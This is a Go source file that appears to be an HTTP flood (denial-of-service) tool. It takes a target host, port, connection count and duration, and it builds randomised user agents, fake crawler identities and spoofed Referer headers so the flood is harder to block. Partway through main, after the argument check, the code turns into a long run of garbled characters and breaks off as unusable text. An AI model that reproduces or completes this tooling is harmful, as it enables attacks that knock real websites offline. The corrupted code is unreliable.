/*
Coded By ZxC
Upgrade with Mr. E-Cyber
*/
package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

//Start of Random useragent
var (
	str       string = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM=&"
	succ             = 0
	fail             = 0
	acceptall        = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, /;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,/;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, ;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, /\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, /\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, /;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, /;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, ;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,/;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	start    = make(chan bool)
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://www.police.gov.hk/",
		"https://www.mjib.gov.tw/",
		"https://www.president.gov.tw/",
		"https://www.gov.hk",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"http://www.google.com/?q=",
		"https://wordpress.org",
		"https://microsoft.com",
		"https://mozilla.org",
		"https://cloudfare.com",
		"https://en.wikipedia.org",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.google.com/",
        "http://duckduckgo.com/",
        "http://search.yahoo.com/search?p=",
        "http://swisscows.com/en/web?query=",
        "http://gibiru.com/results.html?q=",
        "http://www.bing.com/",
        "http://pornhub.com/",
        "http://www.google.co.ao/search?q=",
        "http://steamcommunity.com/market/search?q=",
        "http://vk.com/profile.php?redirect=",
        "http://www.cia.gov/index.html",
        "http://check-host.net/",
        "http://www.xnxx.com/",
        "http://youtube.com/",
        "http://www.baidu.com/",
        "http://www.google.ru/?hl=ru&q=",
        "http://yandex.ru/yandsearch?text=",
        "http://www.shodanhq.com/search?q=",
        "http://ytmnd.com/search?q=",
        "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
        "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://developers.google.com/speed/pagespeed/insights/?url=",
        "http://help.baidu.com/searchResult?keywords=",
        "https://play.google.com/store/search?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.reddit.com/search?q=",
        "http://www.bestbuytheater.com/events/search?q=",
        "https://careers.carolinashealthcare.org/search?q=",
        "http://jobs.leidos.com/search?q=",
        "http://jobs.bloomberg.com/search?q=",
        "https://www.pinterest.com/search/?q=",
        "http://millercenter.org/search?q=",
        "https://www.npmjs.com/search?q=",
        "http://www.evidence.nhs.uk/search?q=",
        "http://www.ted.com/search?q=",
        "'http://funnymama.com/search?q=",
        "http://itch.io/search?q=",
        "http://jobs.rbs.com/jobs/search?q=",
        "http://taginfo.openstreetmap.org/search?q=",
        "https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 
		"https://drive.google.com/viewerng/viewer?url=", 
		"http://www.google.com/translate?u=", 
		"https://developers.google.com/speed/pagespeed/insights/?url=", 
		"http://help.baidu.com/searchResult?keywords=", 
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 	
	}
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.html)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
)

func useragent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	if len(os.Args) != 7 {
		fmt.Printf("Usage: %s host port mode connections seconds timeout(second)\r\n", os.Args[0])
		os.Exit(1)
	}

	×äõâÃ¬¤ñÑä÷ãÈþ£¡ÚçÖðåÆü òÑ²×Èð±Æ¨ö¡Ñº¢°ü«¤»ÕòâÅ¨óñ¶ÜÜÈ¡ãÉ¦«§ºÒÌ¦¾¨ö¤Ð³ó¾Â­§ ÒºÔÉðäÉý¤§ÚáÒÛÎ÷³¨ £ãÛð·Â®ªð±ÔÌ¡å¬ ö×·ÒË¦ãù¡ ´Îñ¾­¢öÑäÒÛÈ¦¶­ñ¢µÑÞ¦±­ öÑàÜÞõ°È®£ö±Ü÷çÀ¬«ñ´Ñ¦¶Ã¬¥ñ±Þ¢ãÃ©ô¦¶¢±Á§§ªÓäÕò±¦¥ö´ÔÜÏð±Å­£÷Ñ»ÜÎö¿Ä¬¦¥ÚµÑÙÎ§³Ç©  µó¾È©ªõ×·×Ìö±Åª¤§Ú°û³É¬¡ª±Ý¦çû§òÓ·Üõä¦ñòÑ³Ó äÀù÷¦µÝ¥±Éüð áÝô¾Âú÷¦²ÖòäÀ¨ó Ö´ÐÉôµÇª¢¢×²Üû³¬¥ Ô¶ÓÏ¦·ùô÷Ö´ÒÚËö²Àª¡ªÐºÓÞÌ¡ãÄ¯ñõ¶ÕÙËûäÃ«ó«Ó´Ì µÃ¨ð¤Ò°ÖóåÃ¯ª÷ÖãÖ¢·Ä¦÷ñ±ó³Àù¦§³òâÅ©¡öÛáó¾ù¡ªÔã×ò¿Âª§òÖ»Ö¢±É®¡÷³Î ¶ýö¤Ð±ÓÞÈû¿¨¢§ºÔÌ¥¿Ãþó¢ÓãÓÛÈú±Éù ñÑ² àÇ¬¡¥ºÈò²§£ðµÐû¶Ä¬¢ªºú¶Àûð§àÒñ´Âª§¢äÕòàÄ¯£ñ×»ÝÏ¥âÀ®óñ·ÖÌú²Èúó¡ÛàÖ¥³Ãª÷§ÔáÔÈ °¬ñðÕã×Ù§µ©¦¡ÛºÕÛûµÇ«£§°È¥´®¤òäÕ¦¾È¨ôªá×Ùô´É¨ðñÓ·Îð¾Ã¯ô¦Ñ·Ý§´§¡«ÖçÜ¢µÅ¯óöÑ±Úò±¯  Û»Öö¾Éª¡ªæÓÞõçÄ®¥ Ñ³ÜÈûâÃ¨¤òàÙú¿Â­§§°ð¾Ç®÷¡Õºôã«¥¤ºÐÙòäÅ¯ ¢ÛºÕö³Âù÷ñÔá÷²üóªÕ´ÝÙ÷å¯¦ð±ÓÝ¥¿©ññäô·«ö¢ÓçÜÜ¢âÁ«£«Ñ¶ÕÞÉû´È¬¦ªÔ»Ö÷àÂû¤÷Ñ»ð¿úö¤Û²ÖË¡·Ç¯ðñÐ´Ô¡´ùö«×çÓÈ¥àÃ©ñªãÈ¦¶ÂýóªÑµÔ¥å¬ô÷¶ÜÉóâÂùñöÐäÒÚû³ÂþôñàÓÙÎûâùöªÒ±ô·®¥ª´ÒûåÅûô Ó¶ÕÞö´Éú¥¢çÜ§µÁû£ñ°õ¿Âü£÷ÚºÝÝñ³ÀªóªÕ²Ú¥¶¨«¦ÒäÕÙÌó²­ô ×äÖúçÇ©¡ñÒãÛËõçû ¡ÕäÕû¾«ñð×ºÕÛÌú¿É¬ôõ¶ÜÙÈ¡´Å®¢òä÷ãÄ¯§õÐäÔÞ§äÇýóõÑ»ÜÙÏ ¾Ç¦¤ðÔ»ÙñµÉû÷ñÑµÜÞÌðàÈ¬ó¥ÔãÜ àÅý§ð²¢µú¡¡°ÐÈ¡¶¨£öæÑÎ÷¿Æþ«ñºÐÈ µÈ§ðª·ÕÉú¶® §Ö²ÔÜô¿þ «ÔäÕÌ¦¾Á­÷¡×±×òµÂý§õÒµÜÏ§³¯÷¡Ñ»ÙÉöãÂú¡öÐ°ÐÙ÷¾û«¢Ó±ÖÎû±ÀûôñÑ·Î÷ãü§ ÚãÞ§çÀ¯ðòÖ±ÖÙÌö°§¡öæÎ¦¶þô§Ôºð·È©óñµÓÛÌúä¯ñ¢Ú»Ó¡¶úö÷Ö³ÜûµÃ¯£ªÚ²ÐÝû¶­ £ÐáÐõ·­ó¤ÕàÐÛÉó¶Éúð¡Ò°ô´À«ðõáÑûµþö¤µÒÈðµÈüð«ÔçÒÜõä§§¤×áÐÝðåÄ«§«±ÐÜÉû³Ä«ö¤Ò°Ë¦²ü¦£»Ó ±ý¤ñ°ÞÏôçüô¤ÑäÕõäÉª£¢äÕË¢àÁ¯ª§×·ÔÚðçù¤¦²ÝÈûµÀù«ñÔ²ÜÜó³Æü§¦Õ°ÜòäÀ­§ ÕäÐÙ¢àÁý«ªÔ¶Þò°Ã¬¦«Ô·Öòäý¤ñÕ²Þ¢çÅ¦« Ú²Ôõ°þ¢¡Öµ¢åÆ¬¦öÑçÐÝ÷²Èüñ¢ÓáÑË¦²Á© ¤ÖäË ¿Åû¤«ÓµÕÝõ¿Á¦«òÐ·ÖÉó¾ü¡¦Õ²Õ¡ã«¢«Ö¶ÜÝÉ÷ãÂþó«Ò»ÐÈ¢±Âùñª»ÑÉ¥âª§¤ÐäÐÎ§äÉ¦£¤×àÈ å­£¤áÔò°Ãüð§°Öó¾Æ©§§ÕµÎñãÆýª¤³ÓÝËó°ûð¢×ãÚ¥àÀ««ªÒ±ÑðµÈ¬¥¦Ñ±ÜÌû¾Çþô¤·Òû¾Éù ñçñâ¬£ñÔ°¢àÉû¥¥ÔæÕÝ§´Ä­¦¡ÚæÔÈôäÄ««§ÐºÑÜÈñ³Å§ñ¤Ô±Öò±Éù§õÖµÐÞË¥åü§«×ºû¾Éþ§«Òç¢¿Ä®¥õ±§´¬¦õÛ¶ÜÚñà§ñòÕçÓûàÇ©££ÚãÐËô°Äþ÷¦á¡°Å¦ðªáÒÙ¢å¨ð¦ÕáÑñ²Å¦£¦ÒµÕÏò±ý¥ª»×ÞôåÈªö«çÞ¥´ú¢¦ÒçÓ÷±«ô¢Ú²ÝÎð¾Â«ö ÚãÑ åÃþöñÐºÝË¦·ù¡õµû²È§««Ö»Ý¦åÇþó¥Ó²Û§¶Èü÷¡³úãÁ®÷õ°ÕÞÌ§äÉ®÷¦°Îû°­«öÓºÓÚÌ÷¶Åù¥«×°ÓñåÆ¯¥òãÖÌò´¯ö«ÐãÓ§±ÄüñªÑ±ð´À¦ööÐºÉ¦³©óòÐ»×û¶ù¥÷áÕÛ¦±¨ó÷³Ý§³Äü¥¡ÓáÜÈ÷°¨ «ÐáÔú³ûª¦²Ïð¿¨÷÷ÔäÑ¢àÀþ §áÐú´Ä¬ª¤æÖÎ¦çÃþö£Û»ÒÛÈò±É¦ô¤Õ¶Ôû´Â«¡¢Õ»ÐÝÈóãÅ­¦¥ÓºÔÞÏöçÁ§ðñ×ãÑÉ÷¿«¤§ÖàÕ¡àÃ¦ö¥àÓÈ÷¿È­ªõÛ·ÐÌ¡çÂþóðÓäÐÙËñåú¦¥äÞòàÄ®÷ñµÓÝÏ¡âû¦«»ÕÈ÷·À¨¤ªÑ·ÓÞÌõ¶Ã©¡ªÕäÔÝÉõ³ùª¦ÑãÞôµþ¤ðÐ³×ÝËöµÅû÷ Õá×Ûö±Ã©÷öÑ°Ì¢·®ñ¦æÕÉ§ç©ô¥ÕáÖÙ§°ý§ª·Ü¥¶Á¨ö¥Ñ¶ò¾Â«¦ð»öäÅûôªÓ°ÐÜÏ ±Æ©¡¥µöçÉú«ðÛçÐÛÏðä©¢«±¡äÀùñðÓäÒú¶Æþ£öàÜÌ¦çÂ¬ð¤ÓãÎñäþô¤×àÛðàÇû£õ·ÓËöçÈùô£×°Ì¢åÂýð÷ÔçÖÞñ¶Ãù÷ñÛæÝ¥µÂü¢¥Ñ·Óô´Å¯ôªÑäË¦åÃªó«Ñ±Ò¡åÆ«ªõÛ²ÑÜÉ¢¶Çûóðµ×÷±À§¤¡ÕäÒú¿¦¥£áÐË§ã©ô¤Ð°§ãÆúðõáÜò¶Ãú¢£æÉ÷à®ðñäÈúäÂý£¥ºÙðµ­÷¢Õ±Îô°Ä§¡«ÒäË÷¶¬«¢ÑãÓ¦µ¬ô¢Ö¶ÑÙôå¯ô¥äÐò²Âþ¤§Û²ÒÙÌñçÄû¡÷Û·Òõ³Æ¯ñ¢ÒáÒ§¶Ã¯«ª¶ÓÜðã§¤öµÕÜÏóãÇþ¥öäÔó¿Å§¦ ×°óäÁûô«Û´×Üó¾É¦«ñÚ¶ÔÈ§³È¯ó«æÝÙ¡àªóöÒãÔóåÁ¯÷õÚºÙ µ¨¡÷äÑÝ °Äª÷ö°ÓÈ÷·Ç®¥¡Ú°È¦³Ä§¦ñÚæÔö°¨ôðÕ»ÓÉ¦¶®ñ÷äÜó·ýññ·Ü¥´Çý¡õÚäÝ¦´ùô¥ÓäÝöâÇùóõÐ´ÜÚõç© ¤µÕú±Âþ§òÒ»ÑÙ¥·þ«¤Ó»¢ãÈúª µÑûåÄý§ Ö³Üó¿Âú¢òÑ³Õñç¯óò³Öö¶Ãþ¡¦Ó±ÔÝ¢±Çþ÷öæÖÙ¦¾É¯««ºÝ¡äû÷§ÕºÕÜÎñâ¦£«ÛãÖ¦çÄ¬«ñÓºÔÏ ´Æþô¢áÉó·Á® ¢Ôá¢±Ã¯¥öÓ°ÛÏò¿Æú£òÚäÜ¥â­ô÷äÚÎöåÁ¬§ª´ÜÌð¶Ç¬¥«Ò¶Ñ§µÅ©§÷Ó±ÑÜÈ¥·Äþô ×µ¡ãÃ®¤¦Ñ´ú°É¬£«Ûá¡à¯¡öÓáÔö¿§¢ Ö·Ð¢ã©§öÛµ÷·É§ô«Õ°Ñ¡°¬¥ à×÷ãÁ¨¢ñÖ°ÒÚÎò±È«¦ðÚ´ÚõâÉ§ ð¶¥ãÂ¨¤õÔçôäÀ¨ªòÖäÝñ´ª¢òçÑÈñ±Äùª¡àÕÞÎöå®«§ÓáÓÛÎ¢¾©«÷ÑäÎò±Ã©«¥¶É ä«÷¢ÑæÒû°«£«³Òúåª õÖºÐÜó±ÇüôªÛçÑÈòµ¨¡£°ÔñµÉ¨£ªÛæÝ§äÅú¦ ÐµÉ ·Äª¤¥ÚµÕÏ§²Ç§§ñçÒú·¨¢÷¶§´Â¨ ò×ºÝûâÃý«¤Ö·ÙÎöâÉª¦ð×·ÝÜû³Æýó£×æÈ â«§ªÛ»È¥äÂû öÑ·ÓÚÌ÷´¯ñ¢Ú·Ð¥åÄ¯§õÖãÙ¢¿Åþ §ÕæÖÞðçüññÐ²×É§·À¯§ Õ·ÑÈñãÆüª§Ó°Ý¥â­ôöáÕÚ÷°É¨£¦ÖçÝË¢²Æ¨ð§ÖºÜöà§¢ª´Úöµ¬ñ¤Ó°Ý¥²¨§ ÑµÐÛöçÇüð¥ÐàÑÚöâ«öõÓãÓ÷·Ã©£÷Ñ´Ô¦¿È¯öö»Ó¦àÅ¨¢¡ÔãÒ§´Ç§ðñá§¶É¨«öäÓò´®¡£Òáó·Â¯óòÔàÒÚÌ§äýö¢´ÓÈ °§¢¢ÕãÝðâÀ¦¤÷×²ÓÎõåÄ©ö¤ã×ÎôàÀ§ô£×äÙ¡ã¦¦ð´Õ µÂû§¡Ö²ÑÜ÷²úó¢ÑºÜ¦°Äþ ¤çõ³À¯¥ªÚæÔÙ ·Éü¤¢Ú»öàùª«á ¿Â«ð¢×çòµ¦ô§æÑôåÉ¨¤¡Õ³ËôäÇ§¢ Ô·ÑôäÈ§ôñÚäÙö·Çªð¤ÕæÝË¡²Åù£¡äÖÛòãÉ«¦«Û´ÔËóçûö£µÜÛÏð±ù¥¦Õ³ÑóåÈ¬ô¥×³ÛÏ ¿Á® ¢×áÙ¦µ­§£Û¶×§âú¡ðÕ²ÐÝõà¨ðö²ÑÝË ¿Ç©óñÕæ×ÞËô¶ùñõÓ»×Î¡äÄ¦ó÷ÛäÝôäÉ¯¢õµËñ·¯ª¥Ô°ÐÎõ´Å§¢ ´Ë¥µÉþ¡¦·ÜÚúàÇþ¦ð×¶Îðâ¦ öäÚÈûåÄ§ôò°ÑÈ¢µª¤òÓàÉ¦±Ãúö çÔÌûãÈýð¥´Îû²Èþ£ »ö·Á§§ò·Ý ¿§ª¡»ÝûãÀþö«Ð´ÐöµÆû«¥äÐÚÈ¡±ú ¡ÒºÐÚð¿Æ­¦£Óà×Ïñ³Éû¢òÛ´ÓÚôâÇüª¥çÞ§¾üô¡Õã ¾ù¡¦Õ¶ÓÜð²É¦¢§Ò±ó¿Ãª¦«æÕÞûäú£ñ×»Ò§äù¦¤ÓæÔÙ ±û¥¥»×Þð´Äþª¦·Û§²ùöò×äÉúä©¤ñÐ°ÜËñ±¨¥£°ûåú £Ö²ÔÏ¥°Ä­ñ¥ÑàÓÝñ³Äùñ¢Ú²Öú¿«¥¤Õ´Ýó±Éü¤«Ñ·ÑÛúä¯¤ªæÓò°Æ¬§÷º¥°©¥£Ñàö·È«÷¤æÝ¥²Èª¦ñ×ãÙ§àÇ§£¦ÔæÕú±­¤÷×ãÎ¢µÂ®«òÒºÝÈò´À§ô¦ÕáÕË÷¿Â§ñ ±×§åÀú¡«Ö»Ïðàþ«§Öµ§¿ú¥¤±×ö±¯ªñÔµÓÞû²Âª«ðÕãÏðä¬ª¦àÐ µúó¦×ãÑË¡å«¢÷Ð·Ôû³­ª÷ÕµÉðãÃ¦ö÷ÑçÙÏö°Èý ªÚµð¿Ãª£ªÐã×ÝÈ °Æ¦ðõÛ²Ö¥¶úñ¦Öºñ¾­ª¢ÚæÑÛ¡¿Áûó¡ÒºÔôà¯¥ªÓçÔöåÅ¯¢¥±Ó¡´Ã®ö¢Ô·ÝÞ÷¾ýôòàñäÆ®ô¥ãÕôâ­ó¡àÕËðçÂ¬ó¡Ò»Èú²Çüð¥ÖáÔ¡²Èûö¢ÔçÜ ¿Æ§«õáÜò·Äùª¡ÒµÏô±ýôöÖãÝõàú¤¤çÜö´ûªñÒàÕÜÉö¿Æþóö³×ÌôåÈþ¢¥Ö°ÜÏ¢·Á­ ðÐ°ÑÛ÷¿Ä¦¤¡Û±¢âÄùö¥Ú°×ÞÌñ³Áù£õÖàÒôçÆù¤¤Ò¶ÔÝÎ¦àÇý÷ªÖ³§·¬ôöÑ±ÞË÷±Ä¨ «çÖó³û¢õäÑÌð²Æùö¤Ðã¦ãÇùó¦ãû¶¦öñÓ±ô¿®§ð³ÖÚñä¦¥õ°ÜóäÀ¯÷¤×àÑñµÉý§£æñ´Ç§§§ÚçÎ¡²Éú£õÕàÏû·Á®£öÖµÝ¥ãÇ®öö³ÓËñ¿Âù¥£ÓáÖ ã¦«÷´Ýò±«ôòÖáÈóàÂ©ó¦ÓæÜÛõçÅù¢¢ÐçÝ§³Çù÷£»ÉúâÁªôòæ§äÂû¡òÓã×öµù«ªãÈñ°É¯¦öÐºÞ¦´ýðòÔáÓÛÌû¿Àªð§Ò°×ñ¾««¥×³ÓÈ¢¿Å®¤ò±Ïô¿É§÷¥ºË¦¾Ç¦ñ£Ò¶Òû´®ðð»ÞÈûãÀú¢£ºÜÈ÷±Â©§¤ÒäÌ¦·Ã§ª«´ÎöãÁü§§ÐºÖË¢³Ç§§ð±ÐÈ÷°Æ¬£ö´É¢´Çþ¡§ÓºÜñàª£ñ°Üð·À¨ ¥Ò»Ô÷¿¬¡÷Õ¶ûçÇþ¢¢ÐäÓûåÇû¥¤æÝ ²Èù¥¥ÓºÕÈ¢²Ä¯ª¥ÓµÚð²Ãùö£´ÜÎñ±ª¥ª°ÎóçÃ¨ª Óà¥³© ¢ãÔÚóàÁþ¡ö¶Ö